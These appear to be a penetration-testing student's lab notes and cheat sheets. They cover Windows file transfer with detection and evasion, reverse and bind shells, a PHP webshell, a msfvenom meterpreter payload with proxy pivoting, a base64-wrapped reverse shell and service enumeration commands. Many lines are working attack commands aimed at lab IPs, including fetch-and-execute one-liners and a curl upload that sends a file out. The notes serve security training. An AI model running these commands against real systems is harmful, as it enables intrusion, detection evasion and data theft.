        PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
      + Upload
        PS C:\htb> Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
  * Certutil
    > Casey Smith (@subTee) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto wget for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.
    + Download a File with Certutil
      C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe

[+] Detection
  > Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation. However, although the process of whitelisting all command lines in a particular environment is initially time-consuming, it is very robust and allows for quick detection and alerting on any unusual command lines.
  > Most client-server protocols require the client and server to negotiate how content will be delivered before exchanging information. This is common with the HTTP protocol. There is a need for interoperability amongst different web servers and web browser types to ensure that users have the same experience no matter their browser. HTTP clients are most readily recognized by their user agent string, which the server uses to identify which HTTP client is connecting to it, for example, Firefox, Chrome, etc.
  > User agents are not only used to identify web browsers, but anything acting as an HTTP client and connecting to a web server via HTTP can have a user agent string (i.e., cURL, a custom Python script, or common tools such as sqlmap, or Nmap).
  > Organizations can take some steps to identify potential user agent strings by first building a list of known legitimate user agent strings, user agents used by default operating system processes, common user agents used by update services such as Windows Update, and antivirus updates, etc. These can be fed into a SIEM tool used for threat hunting to filter out legitimate traffic and focus on anomalies that may indicate suspicious behavior. Any suspicious-looking user agent strings can then be further investigated to determine whether they were used to perform malicious actions. This website(http://useragentstring.com/index.php) is handy for identifying common user agent strings. A list of user agent strings is available here (http://useragentstring.com/pages/useragentstring.php)
  > Malicious file transfers can also be detected by their user agents. The following user agents/headers were observed from common HTTP transfer techniques (tested on Windows 10, version 10.0.14393, with PowerShell 5).
    + Invoke-WebRequest - Client
      PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
      PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
    + Invoke-WebRequest - Server
      GET /nc.exe HTTP/1.1
      User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
    + WinHttpRequest - Client
      PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
      PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
      PS C:\htb> $h.send();
      PS C:\htb> iex $h.ResponseText
    + WinHttpRequest - Server
      GET /nc.exe HTTP/1.1
      Connection: Keep-Alive
      Accept: */*
      User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
    + Msxml2 - Client
      PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
      PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
      PS C:\htb> $h.send();
      PS C:\htb> iex $h.responseText
    + Msxml2 - Server
      GET /nc.exe HTTP/1.1
      Accept: */*
      Accept-Language: en-us
      UA-CPU: AMD64
      Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
    + Certutil - Client
      PS C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
      PS C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
    + Certutil - ServerGET /nc.exe HTTP/1.1
      Cache-Control: no-cache
      Connection: Keep-Alive
      Pragma: no-cache
      Accept: */*
      User-Agent: Microsoft-CryptoAPI/10.0
    + BITS - Client
      PS C:\htb> Import-Module bitstransfer;
      PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
      PS C:\htb> $r=gc $env:temp\t;
      PS C:\htb> rm $env:temp\t; 
      PS C:\htb> iex $r
    + BITS - Server
      HEAD /nc.exe HTTP/1.1
      Connection: Keep-Alive
      Accept: */*
      Accept-Encoding: identity
      User-Agent: Microsoft BITS/7.8

[+] Evading Detection
  * Changing User Agent
    > If diligent administrators or defenders have blacklisted any of these User Agents, Invoke-WebRequest contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari. For example, if Chrome is used internally, setting this User Agent may make the request seem legitimate.
      + Listing out User Agents
        PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
    > Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:
      + Request with Chrome User Agent
        PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "C:\Users\Public\nc.exe"

        m1l0js@htb[/htb]$ nc -lvnp 80
        listening on [any] 80 ...
        connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
        GET /nc.exe HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
        (KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
        Host: 10.10.10.32
        Connection: Keep-Alive

  * LOLBAS / GTFOBins
    > Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries." An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:
      + Transferring File with GfxDownloadWrapper.exe
        PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
    > Such a binary might be permitted to run by application whitelisting and be excluded from alerting. Other, more commonly available binaries are also available, and it is worth checking the LOLBAS project to find a suitable "file download" binary that exists in your environment. Linux's equivalent is the GTFOBins project and is definitely also worth checking out. As of the time of writing, the GTFOBins project provides useful information on nearly 40 commonly installed binaries that can be used to perform file transfers.
  
-=-=-=-
#Shells & payloads
* Anatomy of a shell
  > Every operating system has a shell, and to interact with it, we must use an application known as a terminal emulator. Here are some of the most common terminal emulators:
    Terminal Emulator	Operating System
    Windows Terminal	Windows
    cmder	            Windows
    PuTTY	            Windows
    kitty	            Windows, Linux and MacOS
    Alacritty	        Windows, Linux and MacOS
    xterm	            Linux
    GNOME Terminal	  Linux
    MATE Terminal	    Linux
    Konsole	          Linux
    Terminal	        MacOS
    iTerm2	          MacOS
  > Another way we can identify the language interpreter is by viewing the processes running on the machine. In Linux, we can do this using the following command:
    + Shell Validation From 'ps'
      m1l0js@htb[/htb]$ ps
        PID TTY          TIME CMD
       4232 pts/1    00:00:00 bash
      11435 pts/1    00:00:00 ps
  > We can also find out what shell language is in use by viewing the environment variables using the env command:
    + Shell Validation Using 'env'
      m1l0js@htb[/htb]$ env
      SHELL=/bin/bash









* URLs
#2-module ==> Getting started
## Basic Tools

| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `sudo openvpn user.ovpn` | Connect to VPN |
| `ifconfig`/`ip a` | Show our IP address |
| `netstat -rn` | Show networks accessible via the VPN |
| `ssh user@10.10.10.10` | SSH to a remote server |
| `ftp 10.129.42.253` | FTP to a remote server |
| **tmux** |
| `tmux` | Start tmux |
| `ctrl+b` | tmux: default prefix |
| `prefix c` | tmux: new window |
| `prefix 1` | tmux: switch to window (`1`) |
| `prefix shift+%` | tmux: split pane vertically |
| `prefix shift+"` | tmux: split pane horizontally |
| `prefix ->` | tmux: switch to the right pane |
| **Vim** |
| `vim file` | vim: open `file` with vim |
| `esc+i` | vim: enter `insert` mode |
| `esc` | vim: back to `normal` mode |
| `x` | vim: Cut character |
| `dw` | vim: Cut word |
| `dd` | vim: Cut full line |
| `yw` | vim: Copy word |
| `yy` | vim: Copy full line |
| `p` | vim: Paste |
| `:1` | vim: Go to line number 1. |
| `:w` | vim: Write the file 'i.e. save' |
| `:q` | vim: Quit |
| `:q!` | vim: Quit without saving |
| `:wq` | vim: Write and quit |

## Pentesting
| **Command**   | **Description**   |
| --------------|-------------------|
| **Service Scanning** |
| `nmap 10.129.42.253` | Run nmap on an IP |
| `nmap -sV -sC -p- 10.129.42.253` | Run an nmap script scan on an IP |
| `locate scripts/citrix` | List various available nmap scripts |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Run an nmap script on an IP |
| `netcat 10.10.10.10 22` | Grab banner of an open port |
| `socat - TCP:165.22.115.189:30812`| Grab banner of an open port |
| `smbclient -N -L \\\\10.129.42.253` | List SMB Shares |
| `smbclient \\\\10.129.42.253\\users` | Connect to an SMB share |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | Scan SNMP on an IP |
| `onesixtyone -c dict.txt 10.129.42.254` | Brute force SNMP secret string |
| **Web Enumeration** |
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Run a directory scan on a website |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Run a sub-domain scan on a website |
| `curl -IL https://www.inlanefreight.com` | Grab website banner |
| `whatweb 10.10.10.121` | List details about the webserver/certificates |
| `curl 10.10.10.121/robots.txt` | List potential directories in `robots.txt` |
| `ctrl+U` | View page source (in Firefox) |
| **Public Exploits** |
| `searchsploit openssh 7.2` | Search for public exploits for a web application |
| `msfconsole` | MSF: Start the Metasploit Framework |
| `search exploit eternalblue` | MSF: Search for public exploits in MSF |
| `use exploit/windows/smb/ms17_010_psexec` | MSF: Start using an MSF module |
| `show options` | MSF: Show required options for an MSF module |
| `set RHOSTS 10.10.10.40` | MSF: Set a value for an MSF module option |
| `check` | MSF: Test if the target server is vulnerable |
| `exploit` | MSF: Run the exploit on the target server is vulnerable |
| **Using Shells** |
| `nc -lvnp 1234` | Start a `nc` listener on a local port |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f` | Another command to send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f` | Start a bind shell on the remote server |
| `nc 10.10.10.1 1234` | Connect to a bind shell started on the remote server |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell TTY (1) |
| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice | Upgrade shell TTY (2) |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create a webshell php file |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute a command on an uploaded webshell |
| **Privilege Escalation** |
| `./linpeas.sh` | Run `linpeas` script to enumerate remote server |
| `sudo -l` | List available `sudo` privileges |
| `sudo -u user /bin/echo Hello World!` | Run a command with `sudo` |
| `sudo su -` | Switch to root user (if we have access to `sudo su`) |
| `sudo su user -` | Switch to a user (if we have access to `sudo su`) |
| `ssh-keygen -f key` | Create a new SSH key |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Add the generated public key to the user |
| `ssh root@10.10.10.10 -i key` | SSH to the server with the generated private key |
| **Transferring Files** |
| `python3 -m http.server 8000` | Start a local webserver |
| `wget http://10.10.14.1:8000/linpeas.sh` | Download a file on the remote server from our local machine |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download a file on the remote server from our local machine |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | Transfer a file to the remote server with `scp` (requires SSH access) |
| `base64 shell -w 0` | Convert a file to `base64` |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell` | Convert a file from `base64` back to its orig |
| `md5sum shell` | Check the file's `md5sum` to ensure it converted correctly |

-=-=
## WHOIS
| **Command** | **Description** |
|-|-|
| `export TARGET="domain.tld"` | Assign target to an environment variable. |
| `whois $TARGET` | WHOIS lookup for the target. |
---
## DNS Enumeration

| **Command** | **Description** |
|-|-|
| `nslookup $TARGET` | Identify the `A` record for the target domain. |
| `nslookup -query=A $TARGET` | Identify the `A` record for the target domain. |
| `dig $TARGET @<nameserver/IP>` | Identify the `A` record for the target domain.  |
| `dig a $TARGET @<nameserver/IP>` | Identify the `A` record for the target domain.  |
| `nslookup -query=PTR <IP>` | Identify the `PTR` record for the target IP address. |
| `dig -x <IP> @<nameserver/IP>` | Identify the `PTR` record for the target IP address.  |
| `nslookup -query=ANY $TARGET` | Identify `ANY` records for the target domain. |
| `dig any $TARGET @<nameserver/IP>` | Identify `ANY` records for the target domain. |
| `nslookup -query=TXT $TARGET` | Identify the `TXT` records for the target domain. |
| `dig txt $TARGET @<nameserver/IP>` | Identify the `TXT` records for the target domain. |
| `nslookup -query=MX $TARGET` | Identify the `MX` records for the target domain. |
| `dig mx $TARGET @<nameserver/IP>` | Identify the `MX` records for the target domain. |


---
## Passive Subdomain Enumeration

| **Resource/Command** | **Description** |
|-|-|
| `VirusTotal` | [https://www.virustotal.com/gui/home/url](https://www.virustotal.com/gui/home/url) |
| `Censys` | [https://censys.io/](https://censys.io/) |
| `Crt.sh` | [https://crt.sh/](https://crt.sh/) |
| `curl -s https://sonar.omnisint.io/subdomains/{domain} \| jq -r '.[]' \| sort -u` | All subdomains for a given domain. |
| `curl -s https://sonar.omnisint.io/tlds/{domain} \| jq -r '.[]' \| sort -u` | All TLDs found for a given domain. |
| `curl -s https://sonar.omnisint.io/all/{domain} \| jq -r '.[]' \| sort -u` | All results across all TLDs for a given domain. |
| `curl -s https://sonar.omnisint.io/reverse/{ip} \| jq -r '.[]' \| sort -u` | Reverse DNS lookup on IP address. |
| `curl -s https://sonar.omnisint.io/reverse/{ip}/{mask} \| jq -r '.[]' \| sort -u` | Reverse DNS lookup of a CIDR range. |
| `curl -s "https://crt.sh/?q=${TARGET}&output=json" \| jq -r '.[] \| "\(.name_value)\n\(.common_name)"' \| sort -u` | Certificate Transparency. |
| `cat sources.txt \| while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}-${TARGET}";done` | Searching for subdomains and other information on the sources provided in the source.txt list. |

#### Sources.txt
```txt
baidu
bufferoverun
crtsh
hackertarget
otx
projecdiscovery
rapiddns
sublist3r
threatcrowd
trello
urlscan
vhost
virustotal
zoomeye
```

---
## Passive Infrastructure Identification

| **Resource/Command** | **Description** |
|-|-|
| `Netcraft` | [https://www.netcraft.com/](https://www.netcraft.com/) |
| `WayBackMachine` | [http://web.archive.org/](http://web.archive.org/) |
| `WayBackURLs` | [https://github.com/tomnomnom/waybackurls](https://github.com/tomnomnom/waybackurls) |
| `waybackurls -dates https://$TARGET > waybackurls.txt` | Crawling URLs from a domain with the date it was obtained. |


---
## Active Infrastructure Identification

| **Resource/Command** | **Description** |
|-|-|
| `curl -I "http://${TARGET}"` | Display HTTP headers of the target webserver. |
| `whatweb -a https://www.facebook.com -v` | Technology identification. |
| `Wappalyzer` | [https://www.wappalyzer.com/](https://www.wappalyzer.com/) |
| `wafw00f -v https://$TARGET` | WAF Fingerprinting. |
| `Aquatone` | [https://github.com/michenriksen/aquatone](https://github.com/michenriksen/aquatone) |
| `cat subdomain.list \| aquatone -out ./aquatone -screenshot-timeout 1000` | Makes screenshots of all subdomains in the subdomain.list. |


---
## Active Subdomain Enumeration

| **Resource/Command** | **Description** |
|-|-|
| `HackerTarget` | [https://hackertarget.com/zone-transfer/](https://hackertarget.com/zone-transfer/) |
| `SecLists` | [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) |
| `nslookup -type=any -query=AXFR $TARGET nameserver.target.domain` | Zone Transfer using Nslookup against the target domain and its nameserver. |
| `gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"` | Bruteforcing subdomains. |


---
## Virtual Hosts

| **Resource/Command** | **Description** |
|-|-|
| `curl -s http://192.168.10.10 -H "Host: randomtarget.com"` | Changing the HOST HTTP header to request a specific domain. |
| `cat ./vhosts.list \| while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://<IP address> -H "HOST: ${vhost}.target.domain" \| grep "Content-Length: ";done` | Bruteforcing for possible virtual hosts on the target domain. |
| `ffuf -w ./vhosts -u http://<IP address> -H "HOST: FUZZ.target.domain" -fs 612` | Bruteforcing for possible virtual hosts on the target domain using `ffuf`. |


---
## Crawling

| **Resource/Command** | **Description** |
|-|-|
| `ZAP` | [https://www.zaproxy.org/](https://www.zaproxy.org/) |
| `ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt` | Discovering files and folders that cannot be spotted by browsing the website.
| `ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://www.target.domain/FOLDERS/WORDLISTEXTENSIONS` | Mutated bruteforcing against the target web server. |


#List of ports
	https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-ports.html
	https://packetlife.net/media/library/23/common-ports.pdf
Cheatsheet
	- vim 		==> https://vimsheet.com/
	- tmux 		==> https://tmuxcheatsheet.com/

#OWASP top 10

Number	Category	Description
1.	Broken Access Control	Restrictions are not appropriately implemented to prevent users from accessing other users accounts, viewing sensitive data, accessing unauthorized functionality, modifying data, etc.
2.	Cryptographic Failures	Failures related to cryptography which often leads to sensitive data exposure or system compromise.
3.	Injection	User-supplied data is not validated, filtered, or sanitized by the application. Some examples of injections are SQL injection, command injection, LDAP injection, etc.
4.	Insecure Design	These issues happen when the application is not designed with security in mind.
5.	Security Misconfiguration	Missing appropriate security hardening across any part of the application stack, insecure default configurations, open cloud storage, verbose error messages which disclose too much information.
6.	Vulnerable and Outdated Components	Using components (both client-side and server-side) that are vulnerable, unsupported, or out of date.
7.	Identification and Authentication Failures	Authentication-related attacks that target user's identity, authentication, and session management.
8.	Software and Data Integrity Failures	Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs).
9.	Security Logging and Monitoring Failures	This category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected..
10.	Server-Side Request Forgery	SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).


###Last machine
* Using our normal shell to gain a metasploit session
	AM: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.196.85.2 LPORT=5555 -f elf > payload.bin
	VM: wget wget http://192.196.85.2/payload.bin
	         file payload.bin
	         chmod +x payload.bin
	AM: msfconsole -q
	     use exploit/multi/handler
	     set PAYLOAD linux/x64/meterpreter/reverse_tcp
	     set LHOST 192.196.85.2
	     set LPORT 5555
	     run
	VM: ./payload.bin

* Now since we have access to the first target machine, we can easily access the second machine. But if there is some webapp running on that second machine, we can't access it directly, unless we have a proxy setup to relay the request via the compromised target. And that's what we will set up in this step!

* Background the meterpreter session and check the meterpreter session identifier:
	bg
	sessions
	route add 192.108.156.0/24 1
	use auxiliary/server/socks_proxy
	set VERSION 4a
	set SRVPORT 9050 //By defalt, proxychains makes use of port
	run -j //Started as a background process
	proxychains nmap -sT -Pn 192.108.156.3
	proxychains nc -v 192.108.156.3 5555


* Abusing a web shell
	echo 'bash -c "bash -i >& /dev/tcp/192.168.188.133/4126 0>&1"' | base64
   __import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTk2Ljg1LjIvNDQ0NCAwPiYxIgo= | base64 -d | bash")
Basic concepts ==>
#VPN
  VPN uses cryptogrpahy to extend a private network over a public one, like the Internet. When you are connected via VPN, you are actually running the same protocols of the private network. This lets you perform even low-level network operations (i.e. Wireshark)

#Hexadecimal arithmetic 
  In order to distinguish them from decimal numbers, we add 0x at the beginning or h at the end
#Encapsulation 
  If every protocol has a header and a payload, how can a protocol use the one on its lowe layer? The entire upper protocol packet(header plus payload) is the payload of the lower one; this is called encapsulation

IP packets are called datagrams. IP runs on the Internet layer.
Layer 2 packets ==> frames
The CAM (Content Addressable Memory) table is stored in the device's RAM and is constantly refreshed with new information
Routers do not forward packets coming from one interface if they have ff:ff:ff:ff:ff:ff broadcast MAC address.
iptables ==> https://www.frozentux.net/iptables-tutorial/iptables-tutorial.html
#IPv6
	There are prefixes instead of subnets blocks
	reserved addresses ==> ::1/128 is a loopback address and ::FFFF:0:0/96 are IPv4 mapped addresses
	64 bits [network part] : 64 bits [device part]
	48 bits ==> global unicast address ==> Global ones and reside in global internet. This are for Internet global addressing.
	16 bits ==> subnet id. Used for defining subnets
	-=-=-=-=
	unique local and link local ==> Reside only in internal networks
		Unique local ==> Scope internal network or VPN - Internally routable but not routed on Internet
		Link Local ==> Scope network link - Not routed internally or externally
#Wireshark
#Check ports opened
  netstat -tunp, netstat -ano or netstat -p tcp -p upd | lsof -n i4TCP -i4UDP #TCPView from sysinternals
#Check routes
  ip route, route print or netstat -r 
  	#route add -net 192.168.222.0 netmask 255.255.255.0 gw 10.175.34.1 ==> An example
  	#ip route add 192.168.222.0/24 via 10.175.34.1 ==> Another way
#Check ip
  ip addr, ipconfig /alll or ifconfig
#Example of RCE
  GET /?cmd=ls+-la+/home/student #When you got RCE ==> http://demo.ine.local:8000?cmd=curl+192.77.184.2+--upload-file+flag.zip
  301 ==> Moved permanently
  302 ==> The resource is temporarily under another URI



#Tips
## browser
firebug as a complement for firefox

#PNTP (Penetration Testing Process)
## Pre-Engagement
## Information Gathering
## Vulnerability Assessment
## Exploitation
## Post-Exploitation
## Lateral Movement
## Proof-of-Concept
## Post-Engagement

##Pre-Engagement
[+] Compliance
	PCI DSS (Payment Card Industry Data Security Standard)
    	HIPAA (Health Insurance Portability and Accountability Act of 1996)
    	GDPR (General Data Protection Regulation) //Europe
    	CPPA (California Consumer Privacy Act)
    	SOX (Sarbanes-Oxley Act of 2002)
[+] Frameworks
	ISO/IEC 27000
    	COBIT (Control Objectives for Information and Related IT technologies)
    	NIST Special Publication 800-53
    	CIS Controls and CIS Benchmarks
    	CMMC (Cybersecurity Maturity Model Certification)
    	ASD Essential 8 (Australian Cyber Security Centre Essential 8 Maturity Model)
[+] Auditing
	SCAP & STIGs // Security Content Automation Protocol & Security Technical Implementation Guides
    	  SCAP Scan and Stigviewer
##Information Gathering
* Enumeration is a widely used term in cyber security. It stands for information gathering using active (scans) and passive (use of third-party providers) methods. It is important to note that OSINT is an independent procedure and should be performed separately from enumeration because OSINT is based exclusively on passive information gathering and does not involve active enumeration of the given target.
* 	No.	Principle
	1.	There is more than meets the eye. Consider all points of view.
	2.	Distinguish between what we see and what we do not see.
	3.	There are always ways to gain more information. Understand the target.
* 3 main different levels 
	> Infrastructure-based enumeration
		1. Internet Presence	Identification of internet presence and externally accessible infrastructure.	Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures
		2. Gateway	Identify the possible security measures to protect the company's external and internal infrastructure.	Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare
	> Host-based enumeration
		3. Accessible Services	Identify accessible interfaces and services that are hosted externally or internally.	Service Type, Functionality, Configuration, Port, Version, Interface
		4. Processes	Identify the internal processes, sources, and destinations associated with the services.	PID, Processed Data, Tasks, Source, Destination
	> OS-based enumeration
		5. Privileges	Identification of the internal permissions and privileges to the accessible services.	Groups, Users, Permissions, Restrictions, Environment
		6. OS Setup	Identification of the internal components and systems setup.	OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files

## Infrastructure-based Enumeration

|**Command**|**Description**|
|-|-|
| `curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \| jq .` | Certificate transparency. |
| `for i in $(cat ip-addresses.txt);do shodan host $i;done` | Scan each IP address in a list using Shodan. |

----
## Host-based Enumeration
Internet security protocols
Key management
    Kerberos RPKI PKIX Web of trust X.509 XKMS
Application layer
    DKIM DMARC HTTPS PGP Sender ID SPF S/MIME SSH TLS/SSL
Domain Name System
    DANE DNSSEC DNS over HTTPS DNS over TLS CAA
Internet Layer
    IKE IPsec L2TP OpenVPN PPTP WireGuard

##### FTP
|**Command**|**Description**|
|-|-|
| `ftp <FQDN/IP>` | Interact with the FTP service on the target. |
| `nc -nv <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `telnet <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp` | Interact with the FTP service on the target using encrypted connection. |
| `wget -m --no-passive ftp://anonymous:anonymous@<target>` | Download all available files on the target FTP server. |


##### SMB
|**Command**|**Description**|
|-|-|
| `smbclient -N -L //<FQDN/IP>` | Null session authentication on SMB. |
| `smbclient //<FQDN/IP>/<share>` | Connect to a specific SMB share. |
| `rpcclient -U "" <FQDN/IP>` | Interaction with the target using RPC. |
| `samrdump.py <FQDN/IP>` | Username enumeration using Impacket scripts. |
| `smbmap -H <FQDN/IP>` | Enumerating SMB shares. |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Enumerating SMB shares using null session authentication. |
| `enum4linux-ng.py <FQDN/IP> -A` | SMB enumeration using enum4linux. |


##### NFS
|**Command**|**Description**|
|-|-|
| `showmount -e <FQDN/IP>` | Show available NFS shares. |
| `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock` | Mount the specific NFS share.umount ./target-NFS |
| `umount ./target-NFS` | Unmount the specific NFS share. |


##### DNS
|**Command**|**Description**|
|-|-|
| `dig ns <domain.tld> @<nameserver>` | NS request to the specific nameserver. |
| `dig any <domain.tld> @<nameserver>` | ANY request to the specific nameserver. |
| `dig axfr <domain.tld> @<nameserver>` | AXFR request to the specific nameserver. |
| `dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>` | Subdomain brute forcing. |



##### SMTP
|**Command**|**Description**|
|-|-|
| `telnet <FQDN/IP> 25` |  |


##### IMAP/POP3
|**Command**|**Description**|
|-|-|
| `curl -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. |
| `openssl s_client -connect <FQDN/IP>:imaps` | Connect to the IMAPS service. |
| `openssl s_client -connect <FQDN/IP>:pop3s` | Connect to the POP3s service. |


##### SNMP
|**Command**|**Description**|
|-|-|
| `snmpwalk -v2c -c <community string> <FQDN/IP>` | Querying OIDs using snmpwalk. |
| `onesixtyone -c community-strings.list <FQDN/IP>` | Bruteforcing community strings of the SNMP service. |
| `braa <community string>@<FQDN/IP>:.1.*` | Bruteforcing SNMP service OIDs. |


##### MySQL
|**Command**|**Description**|
|-|-|
| `mysql -u <user> -p<password> -h <FQDN/IP>` | Login to the MySQL server. |


##### MSSQL
|**Command**|**Description**|
|-|-|
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Log in to the MSSQL server using Windows authentication. |


##### IPMI
|**Command**|**Description**|
|-|-|
| `msf6 auxiliary(scanner/ipmi/ipmi_version)` | IPMI version detection. |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | Dump IPMI hashes. |


##### Linux Remote Management
|**Command**|**Description**|
|-|-|
| `ssh-audit.py <FQDN/IP>` | Remote security audit against the target SSH service. |
| `ssh <user>@<FQDN/IP>` | Log in to the SSH server using the SSH client. |
| `ssh -i private.key <user>@<FQDN/IP>` | Log in to the SSH server using private key. |
| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | Enforce password-based authentication. |


##### Windows Remote Management
|**Command**|**Description**|
|-|-|
| `rdp-sec-check.pl <FQDN/IP>` | Check the security settings of the RDP service. |
| `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>` | Log in to the RDP server from Linux. |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>` | Log in to the WinRM server. |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | Execute command using the WMI service. |

###Beginning
     https://rosettacode.org/wiki/Execute_a_system_command
###Passive
* IP addresses
  	host hackersploit.org
  	nslookup hackersploit.org
      > With Nslookup, we can search for domain name servers on the Internet and ask them for information about hosts and domains. Although the tool has two modes, interactive and non-interactive, we will mainly focus on the non-interactive module.
        We can query A records by just submitting a domain name. But we can also use the -query parameter to search specific resource records. Some examples are:
          export TARGET="facebook.com"
          nslookup $TARGET
[+] Whois 
  > We can consider WHOIS as the "white pages" for domain names. It is a TCP-based transaction-oriented query/response protocol listening on TCP port 43 by default. We can use it for querying databases containing domain names, IP addresses, or autonomous systems and provide information services to Internet users. The protocol is defined in RFC 3912. The first WHOIS directory was created in the early 1970s by Elizabeth Feinler and her team working out of Stanford University's Network Information Center (NIC). Together with her team, they created domains divided into categories based upon a computer's physical address. We can read more about the fascinating history of WHOIS here.

  > The WHOIS domain lookups allow us to retrieve information about the domain name of an already registered domain. The Internet Corporation of Assigned Names and Numbers (ICANN) requires that accredited registrars enter the holder's contact information, the domain's creation, and expiration dates, and other information in the Whois database immediately after registering a domain. In simple terms, the Whois database is a searchable list of all domains currently registered worldwide.

  > WHOIS lookups were initially performed using command-line tools. Nowadays, many web-based tools exist, but command-line options often give us the most control over our queries and help filter and sort the resultant output. Sysinternals WHOIS for Windows or Linux WHOIS command-line utility are our preferred tools for gathering information. However, there are some online versions like whois.domaintools.com we can also use ==> (https://www.whois.com/)
